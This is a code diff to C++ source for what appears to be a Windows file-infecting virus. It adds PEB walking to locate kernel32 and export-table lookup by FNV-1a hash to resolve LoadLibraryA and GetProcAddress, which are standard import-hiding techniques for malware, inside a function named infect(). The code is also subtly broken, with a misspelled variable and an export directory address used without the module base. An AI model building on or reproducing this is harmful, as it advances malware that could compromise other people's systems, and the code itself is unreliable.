@@ -60,7 +60,7 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
 
 std::uint32_t fnv321a(const char *string)
 {
-   register std::uint32_t hashval = 0x811c9dc5;
+   std::uint32_t hashval = 0x811c9dc5;
 
    if (string == nullptr)
       return hashval;
@@ -74,6 +74,28 @@ std::uint32_t fnv321a(const char *string)
    return hashval;
 }
 
+LPVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
+{
+   PIMAGE_NT_HEADERS nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<const std::uint8_t *>(module)+module->e_lfanew);
+   PIMAGE_EXPORT_DIRECTORY export_directory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+   PDWORD name_pointers = reinterpret_cast<PDWORD>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNames);
+   PWORD name_ordinals = reinterpret_cast<PWORD>(reinterpret_cast<const std::uint8_t *>(module)+expot_directory->AddressOfNameOrdinals);
+   PDWORD functions = reinterpret_cast<PDWORD>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfFunctions);
+
+   for (std::uint32_t i=0; i<export_directory->NumberOfNames; ++i)
+   {
+      char *name = reinterpret_cast<char *>(reinterpret_cast<const std::uint8_t *>(module)+name_pointers[i]);
+      std::wcout << name << std::endl;
+
+      if (fnv321a(name) != hash)
+         continue;
+
+      return reinterpret_cast<LPVOID>(reinterpret_cast<const std::uint8_t *>(module)+functions[name_ordinals[i]]);
+   }
+
+   return nullptr;
+}
+
 void infect(void)
 {
 #if defined(BROODSAC32)
@@ -84,6 +106,7 @@ void infect(void)
 
    PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
    PLIST_ENTRY list_entry = ldr->InLoadOrderModuleList.Flink;
+   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = nullptr;
 
    while (list_entry != nullptr)
    {
@@ -96,16 +119,19 @@ void infect(void)
       }
 
       if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == 0x4e00520045004b) // L"KERN"
+      {
+         kernel32 = table_entry;
          break;
+      }
       
       list_entry = table_entry->InLoadOrderLinks.Flink;
    }
 
-   if (list_entry != nullptr)
-      std::wcout << "found kernel32" << std::endl;
+   if (kernel32 == nullptr)
+      return;
 
-   std::wcout << "LoadLibraryA: " << std::hex << fnv321a("LoadLibraryA") << std::endl;
-   std::wcout << "GetProcAddress: " << std::hex << fnv321a("GetProcAddress") << std::endl;
+   std::wcout << "LoadLibraryA: " << std::hex << (std::uintptr_t)get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f) << std::endl;
+   std::wcout << "GetProcAddress: " << std::hex << (std::uintptr_t)get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xf8f45725) << std::endl;
 }
 
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
